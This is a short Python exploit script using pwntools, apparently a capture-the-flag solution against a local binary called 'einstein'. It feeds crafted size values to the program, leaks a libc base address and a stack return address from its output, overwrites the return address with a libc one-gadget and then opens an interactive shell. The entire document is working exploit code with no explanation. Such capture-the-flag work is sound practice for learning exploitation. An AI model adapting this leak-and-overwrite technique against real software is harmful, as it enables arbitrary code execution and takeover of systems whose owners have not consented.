from pwn import *

#context.log_level = "debug"

p = process("einstein")

p.sendlineafter(b"story ?\n", str(0x30000).encode())
p.sendlineafter(b"space ?\n", str(2327984+0x28).encode())

p.sendafter(b"\n",  b"\ff") 

p.recv(5)

libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x205710
print("[+] libc base: %016x" % libc_base)
p.recv(0x92)
ret_address = u64(p.recv(6).ljust(8, b"\x00")) - 0x130
print("[+] ret addres: %016x" % ret_address)

for _ in range(2):
	p.sendline(str(ret_address).encode() + b" " + str(libc_base + 0xef52b).encode())

p.interactive()
